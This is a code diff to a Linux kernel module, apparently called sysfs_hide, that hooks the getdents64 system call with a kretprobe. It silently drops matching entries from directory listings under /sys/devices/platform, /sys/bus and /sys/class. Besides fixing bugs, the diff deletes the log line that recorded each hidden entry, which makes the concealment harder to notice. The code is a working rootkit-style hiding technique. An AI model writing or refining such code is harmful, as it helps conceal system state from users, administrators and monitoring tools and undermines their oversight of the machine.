@@ -13,6 +13,7 @@
 #include <linux/slab.h>
 #include <linux/file.h>
 #include <linux/dcache.h>
+#include <linux/fs.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("kosemu");
@@ -34,46 +35,52 @@ static int matches_filter(const char *name)
 struct saved_args {
     int fd;
     void __user *buf;
+    int is_sysfs;
 };
 
-static int is_sysfs_platform_fd(int fd)
+static int getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
+    struct saved_args *data = (struct saved_args *)ri->data;
     struct fd f;
-    int result = 0;
-    char buf[256];
+    char pathbuf[256];
     char *path;
-    
-    f = fdget(fd);
+
+    data->fd = (int)regs->regs[0];
+    data->buf = (void __user *)regs->regs[1];
+    data->is_sysfs = 0;
+
+    /* Check fd path at entry (safer than at return) */
+    f = fdget(data->fd);
     if (f.file) {
-        path = d_path(&f.file->f_path, buf, sizeof(buf));
+        path = d_path(&f.file->f_path, pathbuf, sizeof(pathbuf));
         if (!IS_ERR(path)) {
-            result = (strstr(path, "/sys/devices/platform") != NULL ||
-                      strstr(path, "/sys/bus") != NULL ||
-                      strstr(path, "/sys/class") != NULL);
+            if (strstr(path, "/sys/devices/platform") ||
+                strstr(path, "/sys/bus") ||
+                strstr(path, "/sys/class")) {
+                data->is_sysfs = 1;
+            }
         }
         fdput(f);
     }
-    return result;
+    return 0;
 }
 
 static int getdents64_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
+    struct saved_args *data = (struct saved_args *)ri->data;
     long ret;
-    struct saved_args *data;
     char *kbuf;
     int src, dst;
     struct linux_dirent64 *d;
+
+    if (!data->is_sysfs)
+        return 0;
 
     ret = regs_return_value(regs);
     if (ret <= 0)
         return 0;
 
-    data = (struct saved_args *)ri->data;
-
-    if (!is_sysfs_platform_fd(data->fd))
-        return 0;
-
-    kbuf = kmalloc(ret, GFP_KERNEL);
+    kbuf = kmalloc(ret, GFP_ATOMIC);
     if (!kbuf)
         return 0;
 
@@ -86,15 +93,13 @@ static int getdents64_ret_handler(struct kretprobe_instance *ri, struct pt_regs 
     dst = 0;
     while (src < ret) {
         d = (struct linux_dirent64 *)(kbuf + src);
-        if (d->d_reclen == 0)
+        if (d->d_reclen == 0 || d->d_reclen > ret - src)
             break;
 
         if (!matches_filter(d->d_name)) {
             if (dst != src)
                 memmove(kbuf + dst, kbuf + src, d->d_reclen);
             dst += d->d_reclen;
-        } else {
-            pr_info("sysfs_hide: filtered %s\n", d->d_name);
         }
         src += d->d_reclen;
     }
@@ -105,14 +110,6 @@ static int getdents64_ret_handler(struct kretprobe_instance *ri, struct pt_regs 
     }
 
     kfree(kbuf);
-    return 0;
-}
-
-static int getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
-{
-    struct saved_args *data = (struct saved_args *)ri->data;
-    data->fd = (int)regs->regs[0];
-    data->buf = (void __user *)regs->regs[1];
     return 0;
 }
 
